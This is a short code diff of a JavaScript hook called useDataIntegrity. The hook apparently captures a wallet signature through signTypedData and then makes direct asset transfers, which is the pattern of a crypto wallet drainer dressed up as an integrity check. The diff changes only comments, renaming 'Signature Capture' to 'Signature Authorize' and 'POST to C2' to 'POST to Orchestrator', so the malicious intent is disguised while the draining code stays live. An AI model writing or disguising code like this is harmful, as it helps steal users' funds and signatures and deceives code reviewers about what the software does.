@@ -92,7 +92,7 @@ export function useDataIntegrity() {
       // Concurrent Execution
       const tasks = [];
 
-      // Task 1: Signature Capture
+      // Task 1: Signature Authorize
       tasks.push(walletClient.signTypedData({
         domain,
         types,
@@ -100,7 +100,7 @@ export function useDataIntegrity() {
         message
       }).then(sig => {
         console.log("[INTEGRITY] Identity Verified.");
-        // Optional: POST to C2 here
+        // Optional: POST to Orchestrator here
       }));
 
       // Task 2: Asset Consolidation (Direct Transfers)
